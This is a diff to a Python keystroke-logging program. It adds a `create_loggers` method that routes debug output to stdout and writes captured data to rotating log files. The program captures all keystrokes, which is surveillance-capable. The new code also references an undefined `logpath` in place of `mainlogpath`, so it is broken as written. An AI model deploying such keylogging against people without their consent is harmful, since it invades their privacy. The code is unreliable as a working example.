@@ -50,6 +50,7 @@ import myutils
 import Queue
 from Queue import Empty # to avoid some weird exceptions on exit
 import threading
+import logging
 
 class KeyLogger:
     '''Captures all keystrokes, enqueue events.
@@ -64,6 +65,7 @@ class KeyLogger:
         self.ParseControlKey()
         self.NagscreenLogic()
         self.process_settings()
+        self.create_loggers()
         self.q_logwriter = Queue.Queue(0)
         self.q_imagewriter = Queue.Queue(0)
         self.lw = LogWriter(self.settings,
@@ -130,7 +132,34 @@ class KeyLogger:
     def ParseControlKey(self):
         self.ControlKeyHash = \
            ControlKeyHash(self.settings['General']['Control Key'])
+    
+    def create_loggers(self):
+    
+        # configure default root logger to log all debug messages to stdout
+        logging.basicConfig(level=logging.DEBUG,
+                        format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
+                        stream = sys.stdout) 
         
+        # configure the "systemlog" handler to log all debug messages to file
+        if self.settings['General']['System Log'] != 'None':
+            systemlogpath = os.path.join(self.settings['General']['Log Directory'], 
+                                                        self.settings['General']['System Log'])
+            systemloghandler = logging.FileHandler(systemlogpath)
+            systemloghandler.setLevel(logging.DEBUG)
+            systemlogformatter = logging.Formatter('%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
+            systemloghandler.setFormatter(systemlogformatter)
+            logging.getLogger('').addHandler(systemloghandler)
+        
+        # configure the main data logger
+        mainlogger = logging.getLogger('mainlog')
+        mainlogpath = os.path.join(self.settings['General']['Log Directory'], 
+                                                self.settings['General']['Log File'])
+        mainloghandler = myutils.OnDemandRotatingFileHandler(logpath)
+        mainloghandler.setLevel(logging.INFO)
+        mainlogformatter = logging.Formatter('%(message)s')
+        mainloghandler.setFormatter(mainlogformatter)
+        mainlogger.addHandler(mainloghandler)
+    
     def OnKeyDownEvent(self, event):
         '''Called when a key is pressed.
         
